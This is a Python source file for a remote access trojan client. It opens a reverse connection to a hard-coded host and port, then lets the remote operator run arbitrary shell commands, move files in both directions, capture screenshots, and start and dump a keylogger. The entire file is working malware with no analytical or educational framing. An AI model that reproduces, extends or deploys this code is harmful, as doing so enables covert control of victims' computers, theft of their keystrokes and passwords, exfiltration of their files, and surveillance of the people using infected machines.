import socket
import json
import subprocess
import os
import pyautogui
import threading
import keylogger

def send_data(data):
	jsondata = json.dumps(data)
	s.send(jsondata.encode())


def recv_data():
	data = ''
	while True: # Infinite loop so that we can recv more than 1024 bytes in a go.
		try:
			data = data + s.recv(1024).decode().rstrip()
			return json.loads(data) # deserializing the serialized data
		except ValueError:
			continue

def download_file(file_name): 
	f = open(file_name, 'wb') # create a new file in write mode.
	s.settimeout(1)
	chunk = s.recv(1024) # We receive the file as chunks of 1024 bytes
	while True: # Define an infinite loop
		f.write(chunk) # write the recieved chunks to the file.
		try:
			chunk = s.recv(1024) # we'll continue to receive the file until there is nothing more to recieve. Here the program hangs.
		except socket.timeout as e: # Here we exit out of the infinite loop as wet set timeout to 1 earlier.
			break
	s.settimeout(None)
	f.close()

def upload_file(file_name):
	f = open(file_name, "rb")
	s.send(f.read())

def screenshot():
	scrnsht = pyautogui.screenshot()
	scrnsht.save("screenshot.png")


def shell():
	while True:
		command = recv_data()
		if command == "quit":
			break
		elif command == "help":
			pass
		elif command == "clear":
			pass
		elif command[:3] == "cd ":
			try:
				os.chdir(command[3:])
			except FileNotFoundError:
				pass
		elif command[:6] == "upload":
			download_file(command[7:])
		elif command[:8] == "download":
			upload_file(command[9:])
		elif command[:10] == "screenshot":
			screenshot()
			upload_file('screenshot.png')
			os.remove('screenshot.png')
		elif command[:12] == "keylog_start":
			keylog = keylogger.Keylogger()
			t = threading.Thread(target=keylog.start())
			t.start()
			send_data("[+] Keylogger Started!")
		elif command[:11] == "keylog_dump":
			logs = keylog.read_logs()
			send_data(logs)
		elif command[:11] == "keylog_stop":
			keylog.self_destruct()
			t.join()
			send_data("[+] Keylogger Stopped!")

		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			result = result.decode()
			send_data(result)

if __name__ == "__main__":
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.1.105", 5555))
	shell()
